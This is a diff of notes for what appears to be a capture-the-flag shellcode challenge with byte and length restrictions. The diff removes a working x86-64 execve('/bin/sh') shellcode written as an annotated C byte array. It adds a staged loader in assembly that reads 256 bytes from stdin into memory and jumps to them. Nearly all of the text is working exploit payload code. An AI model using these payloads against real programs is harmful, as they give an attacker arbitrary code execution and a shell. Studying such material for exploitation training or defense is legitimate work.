@@ -17,16 +17,16 @@ first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
 divide the shellcode into lines of 6
 first 16 lines must start with 0xc 0x87 0x63
 after the 112 byte(16 bytes from the 16th line), the shellcode will be executed.
-This means we have to limit the shellcode within 112 bytes
+This means we have to limit the shellcode within 96 bytes
 
-char shellcode[] =
-    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
-    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
-    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
-    "\x53"                                          // push   %rbx
-    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
-    "\x50"                                          // push   %rax
-    "\x57"                                          // push   %rdi
-    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
-    "\xb0\x3b"                                      // mov    $0x3b, %al
-    "\x0f\x05";                                     // syscall
+
+push 0x0 #
+pop rdi  #set rdi to zero, since 0 is the file descriptor of stdin
+push rbp #
+pop rsi  #give rbp's address to rsi
+push 0x100 
+pop rdx #this is the length we want to read
+push 0x0 #
+pop rax #set rax to zero, since 0 is read's syscall number
+syscall #0f 05
+call rbp #execute at rbp
